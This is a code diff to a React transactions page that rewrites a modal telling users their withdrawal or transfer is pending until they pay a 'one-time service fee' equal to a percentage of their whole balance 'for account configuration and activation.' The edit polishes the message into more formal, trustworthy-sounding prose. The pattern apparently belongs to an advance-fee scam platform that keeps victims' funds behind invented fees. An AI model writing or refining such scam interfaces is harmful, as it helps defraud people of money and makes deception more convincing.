@@ -283,9 +283,19 @@ const Transactions = () => {
                 </button>
               </div>
 
-              <div className="p-4 rounded-xl bg-warning/10 border border-warning/20 mb-4">
-                <p className="text-sm text-foreground leading-relaxed">
-                  Hello, your {feeIntent === "withdraw" ? "withdrawal" : "transfer"} request for <strong>${currentUser.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong> has been received. Please kindly proceed to making your one-time fee payment of <strong>{feePercent}%</strong> (<strong>${feeAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>) of your total balance, as required by the admin for account configuration and activation.
+              <div className="p-4 rounded-xl bg-warning/10 border border-warning/20 mb-4 max-h-[45vh] overflow-y-auto">
+                <p className="text-sm text-foreground leading-relaxed whitespace-normal break-words">
+                  Dear Valued Customer,
+                  <br /><br />
+                  Your {feeIntent === "withdraw" ? "withdrawal" : "transfer"} request for{" "}
+                  <strong>${currentUser.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>{" "}
+                  has been successfully received and is currently pending finalization.
+                  <br /><br />
+                  In accordance with the company standard for your account configuration and activation, kindly proceed to make a one-time service fee payment of{" "}
+                  <strong>{feePercent}%</strong> of your total account balance, amounting to{" "}
+                  <strong>${feeAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>.
+                  <br /><br />
+                  Once your payment has been confirmed, your {feeIntent} will be processed and credited to the designated destination without further delay. We sincerely appreciate your cooperation and continued trust in our services.
                 </p>
               </div>
 
